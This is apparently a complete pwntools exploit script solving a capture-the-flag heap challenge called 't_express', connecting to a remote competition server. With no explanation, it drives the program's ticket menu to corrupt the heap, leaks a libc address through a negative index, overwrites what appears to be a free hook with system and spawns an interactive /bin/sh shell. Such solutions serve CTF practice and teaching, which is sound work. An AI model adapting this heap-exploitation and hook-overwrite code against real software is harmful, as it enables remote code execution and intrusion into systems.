from pwn import *

#r = process("./t_express", env={"LD_PRELOAD":"./libc.so.6"})
r = remote("t-express.sstf.site", 1337)

def rec():
	return r.recvuntil("choice: ")

rec()
def buy_tick(t, first, last):
	r.sendline("1")
	r.recvuntil(": ")
	r.sendline(str(t))
	for i in [first, last]:
		r.recvuntil(": ")
		r.send(i)
	return rec()

def view_tick(idx):
	r.sendline("2")
	r.recvuntil(": ")
	r.sendline(str(idx))
	return rec()

"""
    (*p)->ticket_type = 0LL;
		    (*p)->meal_ticket = 3;
				    (*p)->safari_pass = 1;
						    (*p)->giftshop_coupon = 1;
								    (*p)->ride_count = 0LL;
										"""

def delete(idx, extra=None):
	r.sendline("3")
	r.recvuntil(":")
	r.sendline(str(idx))
	if extra is not None:
		r.recvuntil(":")
		r.sendline(str(extra))
	return rec()

buy_tick(1, "A"*8, "B"*8)
buy_tick(2, "C"*8, "D"*8)
buy_tick(2, "E"*8, "F"*8)

for i in range(3):
	delete(2, extra="1")
delete(2, extra="2")
delete(2, extra="3")
for i in range(3):
	delete(1, extra="1")
delete(1, extra="2")
delete(1, extra="3")

delete(0, extra="4")
delete(1, extra="5")

libc_leak = view_tick(-8).split("\x7f")[0][-5:] + "\x7f\x00\x00"
libc_leak = u64(libc_leak) - 0x1c1583 - 0x2b1a0

print(hex(libc_leak))
dice = libc_leak + 0x1c3cd0
dice = libc_leak + 0x1eeb28
system = libc_leak + 0x496e0
system = libc_leak + 0x55410
buy_tick(2, p64(dice), "B"*8)
buy_tick(2, "/bin/sh\x00"*8, "C"*8)
buy_tick(2, p64(system), "D"*8)

for i in range(3):
	delete(4, extra="1")
delete(4, extra="2")
delete(4, extra="3")

r.interactive()

